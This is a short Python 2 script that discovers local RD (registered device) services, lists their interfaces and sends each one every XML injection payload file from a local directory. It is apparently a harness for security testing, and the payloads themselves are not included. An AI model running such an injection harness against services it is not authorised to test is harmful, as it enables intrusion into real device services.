from rd_service_connector import RDServiceClient
from lxml import objectify
from os import walk



#init
rd_service_attacker = RDServiceClient()
response = rd_service_attacker.discover_rd_services()
#rd_service_attacker.print_device_info(response)
#dd_response_xml = objectify.fromstring(response.read())
#print "Device Info: " + dd_response_xml.get("info")
if response != 0:
    rd_service_attacker.validate_discovery_headers(response) 
    response_xml = response.read()
    #parse the xml
    services=objectify.fromstring(response_xml)    
    for interface in services.Interface:
        verb=interface.get("id")
        print "Got " + verb
        path = interface.get("path")
        print "Path" + path
        #attack_file_path = 
        for (root, dirnames, attack_files) in walk("xml_injection/Payload/"):
            for attack_file_name in attack_files:
                rd_service_attacker.attack_service(verb,path,root+attack_file_name)
        
    #get the interface
    #for each of interface
    #take each xml file
    #rd_service_attacker.attack_service(interface.id,path,port,attackfilename)

